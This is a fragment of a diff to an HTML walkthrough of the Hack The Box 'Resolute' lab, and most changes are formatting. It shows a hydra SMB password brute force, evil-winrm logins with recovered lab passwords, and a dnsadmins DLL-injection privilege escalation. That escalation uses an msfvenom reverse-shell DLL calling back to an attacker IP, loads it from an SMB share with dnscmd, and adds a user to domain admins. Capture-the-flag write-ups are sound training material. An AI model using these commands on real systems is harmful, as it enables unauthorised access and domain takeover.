+<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-L</span> usernames.txt <span class="at">-P</span> passwords.txt 192.168.2.66 smb <span class="at">-V</span> <span class="at">-f</span></span></code></pre></div>
 <p>We get a hit</p>
 <p><img src="/img/htb_resolute/3.png" /></p>
 <p>So the password is for the user <strong>melanie</strong></p>
@@ -164,7 +164,7 @@ Password: Welcome123!</p>
 </blockquote>
 <h2 id="getting-a-shell-with-evil-winrm">Getting a shell with evil-winrm</h2>
 <p>Using our found creds, we try getting a winrm shell using evil-winrm</p>
-<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="ex">evil-winrm</span> -i  megabank.local -u melanie -p Welcome123!</span></code></pre></div>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">evil-winrm</span> <span class="at">-i</span>  megabank.local <span class="at">-u</span> melanie <span class="at">-p</span> Welcome123!</span></code></pre></div>
 <p>And we get a shell as the user melanie</p>
 <p><img src="/img/htb_resolute/4.png" /></p>
 <p>We find our user.txt file under the . So this is our required user.</p>
@@ -181,31 +181,31 @@ Password: Serv3r4Admin4cc123!</p>
 </blockquote>
 <p>We try logging in with evilwinrm</p>
 <p>In the directory, we fine a note.txt that says</p>
-<div class="sourceCode" id="cb17"><pre class="sourceCode txt"><code class="sourceCode default"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a>Email to team:</span>
-<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a></span>
-<span id="cb17-3"><a href="#cb17-3" aria-hidden="true"></a>- due to change freeze, any system changes (apart from those to the</span>
-<span id="cb17-4"><a href="#cb17-4" aria-hidden="true"></a>  administrator account) will be automatically reverted within 1 minute</span></code></pre></div>
+<div class="sourceCode" id="cb17"><pre class="sourceCode txt"><code class="sourceCode default"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>Email to team:</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>- due to change freeze, any system changes (apart from those to the</span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>  administrator account) will be automatically reverted within 1 minute</span></code></pre></div>
 <h1 id="privilege-escalation---administrator">Privilege escalation - Administrator</h1>
 <h2 id="dll-injection-in-dns-service">DLL injection in DNS service</h2>
 <p>Issuing the command whoami, we find that our user ryan is a memeber of the group <strong>dnsadmins</strong></p>
-<div class="sourceCode" id="cb18"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a>whoami /all</span></code></pre></div>
+<div class="sourceCode" id="cb18"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>whoami /all</span></code></pre></div>
 <p><img src="/img/htb_resolute/7.png" /></p>
 <p>Members of the group dnsadmins can be used for privilege escalation to admin with dll injection. This trick is described <a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">here</a>.</p>
 <p>We can generate our payload dll with msfvenom.</p>
 <pre class="shell"><code>msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.55 LPORT=8888 -f dll -o dns.dll
 smbserver.py SHARE ./</code></pre>
 <p>On target, we can change the config of the dns since the user ryan belongs to the group <strong>dnsadmins</strong>. We can also start and stop the dns service.</p>
-<div class="sourceCode" id="cb20"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a>dnscmd RESOLUTE /config /serverlevelplugindll \\10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">55</span>\SHARE\dnsprivesc.<span class="fu">dll</span></span>
-<span id="cb20-2"><a href="#cb20-2" aria-hidden="true"></a><span class="fu">sc</span>.<span class="fu">exe</span> stop dns</span>
-<span id="cb20-3"><a href="#cb20-3" aria-hidden="true"></a><span class="fu">sc</span>.<span class="fu">exe</span> <span class="fu">start</span> dns</span></code></pre></div>
+<div class="sourceCode" id="cb20"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>dnscmd RESOLUTE /config /serverlevelplugindll \\10.<span class="fu">10</span>.<span class="fu">14</span>.<span class="fu">55</span>\SHARE\dnsprivesc.<span class="fu">dll</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sc</span>.<span class="fu">exe</span> stop dns</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="fu">sc</span>.<span class="fu">exe</span> <span class="fu">start</span> dns</span></code></pre></div>
 <p><img src="/img/htb_resolute/8.png" /></p>
 <p>We open up a nc listener at port 8888</p>
-<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a><span class="ex">nc</span> -lnvp 8888</span></code></pre></div>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 8888</span></code></pre></div>
 <p>Trying a couple of times, failed to get back a reverse shell. Not sure why it did not work. A workaround would be elevating the privileges of a user that we know the password of generating an <strong>exex</strong> payload using msfvenom. We can try adding the user melanie to the admins group using the dll payload. Then the user melanie would give us administrative privileges on the machine. We generate the payload and do the previous steps again on target.</p>
-<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a><span class="ex">msfvenom</span> -p windows/x64/exec cmd=<span class="st">&#39;net group &quot;domain admins&quot; melanie /add /domain&#39;</span> --platform windows -f dll <span class="op">&gt;</span> dns.dll</span>
-<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a><span class="ex">smbserver.py</span> SHARE ./</span></code></pre></div>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="at">-p</span> windows/x64/exec cmd=<span class="st">&#39;net group &quot;domain admins&quot; melanie /add /domain&#39;</span> <span class="at">--platform</span> windows <span class="at">-f</span> dll <span class="op">&gt;</span> dns.dll</span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">smbserver.py</span> SHARE ./</span></code></pre></div>
 <p>Next we login to user melanie using evilwinrm and look at our user info using</p>
-<div class="sourceCode" id="cb23"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a>whoami /all</span></code></pre></div>
+<div class="sourceCode" id="cb23"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>whoami /all</span></code></pre></div>
 <p><img src="/img/htb_resolute/9.png" /></p>
 <p>We see that we are now a member of the administrator group and can execute administrator commands. So we can get our required root.txt at C:.txt</p>
 <p><img src="/img/htb_resolute/10.png" /></p>
